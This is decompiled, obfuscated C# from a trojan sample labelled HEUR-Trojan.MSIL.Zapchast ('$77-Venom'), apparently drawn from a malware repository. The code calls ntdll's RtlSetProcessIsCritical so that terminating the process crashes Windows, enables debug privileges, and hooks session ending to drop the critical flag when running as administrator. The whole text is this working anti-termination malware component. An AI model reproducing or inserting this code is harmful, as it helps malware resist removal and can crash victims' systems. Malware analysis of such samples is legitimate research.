// Decompiled with JetBrains decompiler
// Type: 硧憵蒋㈞ࠔ诇퇎筇蛲렖曫߾固欹䂌㓼書鋐
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Zapchast.gen-815b2bf1ddadfb46a27001e08246e8f82f629eb793963bef856d17e1ef9c4085.exe

using Microsoft.Win32;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading;

public static class 硧\uEAFE憵蒋\u321Eࠔ诇퇎筇蛲렖\uE424曫\u07FE固欹䂌㓼書鋐
{
  public static void \u2729ꐭ夿跂\u2729쌢泌ꗚ쿄琴\uF49C\uED22\uFFFD漖菣֦띉쭤ื\u3358(
    object sender,
    SessionEndingEventArgs e)
  {
    if (!硧\uEAFE憵蒋\u321Eࠔ诇퇎筇蛲렖\uE424曫\u07FE固欹䂌㓼書鋐.\u0A7Cᦡ댍噉꼫䎷損䁩ꏛ抛髦圪ມ喭虍伒㦱岊ႈ斅())
      return;
    硧\uEAFE憵蒋\u321Eࠔ诇퇎筇蛲렖\uE424曫\u07FE固欹䂌㓼書鋐.\uEFD5䂉ⶮ軾\uE651閉ᠸૃᤂ疥\uEC96旊螻諜罛\uFE55ٯ啸䝈䚾();
  }

  public static void 폓\u0EF9싹鈣ꈾ娱䠈쯍軨놻ꃨᚄ无醻ꒂ鸯憖䞼澏쥼()
  {
    try
    {
      SystemEvents.SessionEnding += new SessionEndingEventHandler(硧\uEAFE憵蒋\u321Eࠔ诇퇎筇蛲렖\uE424曫\u07FE固欹䂌㓼書鋐.\u2729ꐭ夿跂\u2729쌢泌ꗚ쿄琴\uF49C\uED22\uFFFD漖菣֦띉쭤ื\u3358);
      Process.EnterDebugMode();
      硧\uEAFE憵蒋\u321Eࠔ诇퇎筇蛲렖\uE424曫\u07FE固欹䂌㓼書鋐.\uEF5A\uF0BE䉓Ў鉑\uEB39쿿뎜ꓰ낿啛冡ﲈ칤\uE400ꂢꖣ\uE794튠ڶ(1U, 0U, 0U);
    }
    catch
    {
    }
  }

  public static void \uEFD5䂉ⶮ軾\uE651閉ᠸૃᤂ疥\uEC96旊螻諜罛\uFE55ٯ啸䝈䚾()
  {
    try
    {
      硧\uEAFE憵蒋\u321Eࠔ诇퇎筇蛲렖\uE424曫\u07FE固欹䂌㓼書鋐.\uEF5A\uF0BE䉓Ў鉑\uEB39쿿뎜ꓰ낿啛冡ﲈ칤\uE400ꂢꖣ\uE794튠ڶ(0U, 0U, 0U);
    }
    catch
    {
      while (true)
        Thread.Sleep(100000);
    }
  }

  public static bool \u0A7Cᦡ댍噉꼫䎷損䁩ꏛ抛髦圪ມ喭虍伒㦱岊ႈ斅() => new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);

  [DllImport("ntdll.dll", EntryPoint = "RtlSetProcessIsCritical", SetLastError = true)]
  private static extern void \uEF5A\uF0BE䉓Ў鉑\uEB39쿿뎜ꓰ낿啛冡ﲈ칤\uE400ꂢꖣ\uE794튠ڶ(
    uint v1,
    uint v2,
    uint v3);
}
